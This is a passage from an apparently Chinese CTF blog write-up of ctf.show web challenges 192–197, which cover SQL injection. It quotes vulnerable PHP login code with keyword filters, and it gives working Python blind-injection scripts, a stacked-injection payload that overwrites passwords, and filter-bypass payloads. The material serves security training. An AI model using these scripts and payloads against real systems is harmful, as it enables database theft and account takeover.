</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>不给我转是吧，那我不转了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://20b20943-6b5a-464b-b13e-99ab8e2644b7.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">flagstr</span><span class="o">=</span><span class="s2">&#34; _</span><span class="si">{}</span><span class="s2">-&#34;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">flagstr</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)regexp(&#39;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;),1,2)=&#39;1&#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span> <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="k">if</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">break</span>
</span></span></code></pre></div><p>其实也差不多</p>
<p>二分法脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># 用了二分法 dejavu~~~</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"># 表名 CtFsHOw{FL0G,CtFsHOw{usEr</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># payload = &#34;0&#39; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)&gt;&#39;{}&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"># 列名 ID,F1AG,ID,usErNAME,pAss</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"># payload = &#34;0&#39; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1)&gt;&#39;{}&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># flag</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;0&#39; or if(substr((select f1ag from ctfshow_fl0g),</span><span class="si">{}</span><span class="s2">,1)&gt;&#39;</span><span class="si">{}</span><span class="s2">&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">true_flag</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">u5bc6</span><span class="se">\\</span><span class="s2">u7801</span><span class="se">\\</span><span class="s2">u9519</span><span class="se">\\</span><span class="s2">u8bef&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">while</span> <span class="ow">not</span> <span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="n">start</span><span class="o">-</span><span class="n">end</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">start</span> <span class="o">==</span> <span class="n">end</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">start</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">p</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">if</span> <span class="n">true_flag</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">start</span> <span class="o">=</span> <span class="n">p</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">end</span> <span class="o">=</span> <span class="n">p</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">if</span> <span class="n">end</span> <span class="o">&lt;</span> <span class="n">start</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="n">start</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">end</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] result: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span></code></pre></div><h4 id="web193">web193<a hidden class="anchor" aria-hidden="true" href="#web193">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex|substr/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p><strong>新增waf</strong>：substr</p>
<p>没办法进行截断，但其实问题不大</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://a4ac8172-cadd-42ca-a986-771b4ab0400f.challenge.ctf.show/api/&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">letter</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyz-_,</span><span class="si">{}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="c1"># 查表</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1"># 查字段</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="c1"># 查flag</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_flxg&#34;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="s2">&#34;admin&#39; and if((</span><span class="si">{}</span><span class="s2">) like &#39;</span><span class="si">{}</span><span class="s2">%&#39;,1,2) =&#39;1&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">result</span><span class="o">+</span><span class="n">j</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span> <span class="o">==</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>我们可以用like来达到差不多的效果</p>
<p>这题也可以用char,left,right,substring之类的方法</p>
<h4 id="web194">web194<a hidden class="anchor" aria-hidden="true" href="#web194">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex|substr|char|left|right|substring/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p><strong>新增waf</strong>：char|left|right|substring</p>
<p>上题的方法依旧适用</p>
<h4 id="web195">web195<a hidden class="anchor" aria-hidden="true" href="#web195">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = </span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&#34;|select|union|or|and|\x26|\x7c|file|into/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;登陆成功 flag is </span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>根据提示堆叠注入</p>
<p>其实就是在;后面再执行任意的sql命令</p>
<p>这里直接改密码</p>
<pre tabindex="0"><code>payload=&#34;0x61646d696e;update`ctfshow_user`set`pass`=0x313131;&#34;
# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围
sql = &#34;select pass from ctfshow_user where username = {$username};&#34;;
# @Author:Y4tacker
</code></pre><pre tabindex="0"><code>admin &lt;=&gt; 0x61646d696e
111&lt;=&gt;0x313131
</code></pre><p><img alt="image-20250210000521664" loading="lazy" src="../assets/image-20250210000521664.png"></p>
<h4 id="web196">web196<a hidden class="anchor" aria-hidden="true" href="#web196">#</a></h4>
<pre tabindex="0"><code>查询语句

  //拼接sql语句查找指定ID用户
  $sql = &#34;select pass from ctfshow_user where username = {$username};&#34;;
      
返回逻辑


  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&#34;|select|union|or|and|\x26|\x7c|file|into/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;
    die(json_encode($ret));
  }

  if(strlen($username)&gt;16){
    $ret[&#39;msg&#39;]=&#39;用户名不能超过16个字符&#39;;
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret[&#39;msg&#39;]=&#34;登陆成功 flag is $flag&#34;;
  }
      
</code></pre><p>这题应该是bug了，select没被waf</p>
<p><img alt="在这里插入图片描述" loading="lazy" src="../assets/1e88bb7a716790c989f552fb4a0e1a2a.png"></p>
<p>在 PHP 里，当使用数据库查询语句从数据库中获取结果集时，通常会逐行遍历结果集。每一行数据可以用一个数组来表示，<code>$row[0]</code> 指的是这一行数组中的第一个元素。</p>
<p>payload:</p>
<pre tabindex="0"><code>0;select(2)
2
</code></pre><h4 id="web197">web197<a hidden class="anchor" aria-hidden="true" href="#web197">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
